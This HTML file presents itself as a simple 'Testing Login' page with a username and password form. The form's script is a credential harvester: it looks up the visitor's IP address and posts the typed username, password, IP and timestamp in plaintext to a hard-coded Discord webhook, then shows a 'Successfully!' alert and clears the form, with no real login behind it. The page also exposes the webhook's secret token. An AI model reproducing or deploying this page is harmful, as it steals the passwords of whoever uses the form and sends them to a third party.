<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Testing Login</title>
    <link rel="stylesheet" href="/styles.css">
</head>
<body>
<div class="loginBlock">
    <form id="loginForm" onsubmit="return handleSubmit(event)">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        
        <button type="submit">Login</button>
    </form>
</div>
<script>
async function handleSubmit(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const timestamp = new Date().toISOString();
    
    try {
        // Get IP address first
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        // Discord webhook call
        const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";
        
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: "Login Bot",
                embeds: [{
                    title: "üîê New Login Attempt",
                    color: 0xFF0000,
                    fields: [
                        {
                            name: "üë§ Username",
                            value: username,
                            inline: true
                        },
                        {
                            name: "üîë Password",
                            value: password,
                            inline: true
                        },
                        {
                            name: "üåê IP Address",
                            value: ipAddress,
                            inline: true
                        },
                        {
                            name: "‚è∞ Timestamp",
                            value: new Date(timestamp).toLocaleString(),
                            inline: false
                        }
                    ]
                }]
            })
        });
        
        if (response.ok) {
            alert('Successfully!');
            document.getElementById('loginForm').reset();
        } else {
            throw new Error('Failed');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Error: ' + error.message);
    }
    return false;
}
</script>
</body>
</html>
